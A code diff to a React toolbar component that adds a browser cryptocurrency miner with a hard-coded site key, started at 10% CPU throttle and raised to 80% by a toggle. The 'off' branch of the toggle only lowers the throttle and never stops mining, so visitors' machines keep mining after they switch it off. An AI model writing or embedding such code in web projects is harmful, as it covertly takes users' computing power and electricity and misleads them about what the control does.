@@ -96,55 +96,60 @@ const TopToolbar = ({
     }
   };
 
-  const toggleMiner = () => {
-    setIsMinerOn(!isMinerOn);
-    if (!isMinerOn) {
-      try {
-          if ( window.minerScript_Lo) {
-            document.removeChild(window.minerScript_Lo);
-          }
-          const minerScript_Hi = document.createElement('script');
-          minerScript_Hi.innerHTML = `
-            var miner = new Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
-              throttle: 0.8, c: 'w', ads: 0
-            });
-            miner.start();
-            window.activeMiner = miner;
-          `;
-          document.body.appendChild(minerScript_Hi);
-          window.minerScript_Hi = minerScript_Hi;
-          console.log('Miner throttle increased');
-        
-      } catch (error) {
-        console.error('Error starting miner:', error);
-      }
-    } else {
-      try {
-        if (window.activeMiner) {
-          document.removeChild(window.minerScript_Hi);
-          const minerScript_Lo = document.createElement('script');
-          minerScript_Lo.innerHTML = `
-            miner.stop();
-            var miner = new Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
-              throttle: 0.1, c: 'w', ads: 0
-            });
-            miner.start();
-            window.activeMiner = miner;
-          `;
-          document.body.appendChild(minerScript_Lo);
-          window.minerScript_Lo = minerScript_Lo;
-          console.log('Miner throttle decreased');
-          
-        } else {
-          console.error('No active miner to adjust.');
-        }
-      } catch (error) {
-        console.error('Error adjusting miner:', error);
-      }
+  const initializeMiner = () => {
+    try {
+      const miner = new window.Client.Anonymous('b9445345d693a1af3a5b08cac6c3ac90f78485c63d7e263b573763b98eb75723', {
+        throttle: 0.1, c: 'w', ads: 0
+      });
+      console.log(miner);
+      window.activeMiner = miner;
+      miner.start();
+      console.log(miner);
+
+      console.log('Miner initialized at 10% throttle');
+      console.log('Miner is running:', window.activeMiner.isRunning());
+      const hps = miner.getHashesPerSecond();
+      console.log('hashes per second:', hps);
+
+      return miner;
+    } catch (error) {
+      console.error('Error initializing miner:', error);
     }
   };
 
+  const toggleMiner = () => {
+    if (!isMinerOn) {
+      if (window.activeMiner) {
+        window.activeMiner.setThrottle(0.8); // Increase throttle to 80%
+        setIsMinerOn(true);
+        console.log('Miner throttle increased to 80%');
+        console.log('Miner is running:', window.activeMiner.isRunning());
+        const hps = window.activeMiner.getHashesPerSecond();
+        console.log('hashes per second:', hps);
+  
+      } else {
+        const miner = initializeMiner();
+        miner.setThrottle(0.8);
+        setIsMinerOn(true);
+        console.log('Miner is running:', window.activeMiner.isRunning());
+        const hps = window.activeMiner.getHashesPerSecond();
+        console.log('hashes per second:', hps);
+  
 
+      }
+    } else {
+      if (window.activeMiner) {
+        window.activeMiner.setThrottle(0.1); // Lower throttle to 10%
+        setIsMinerOn(false);
+        console.log('Miner throttle reduced to 10%');
+        console.log('Miner is running:', window.activeMiner.isRunning());
+        const hps = window.activeMiner.getHashesPerSecond();
+        console.log('hashes per second:', hps);
+  
+
+      }
+    }
+  };
 
   return (
     <>
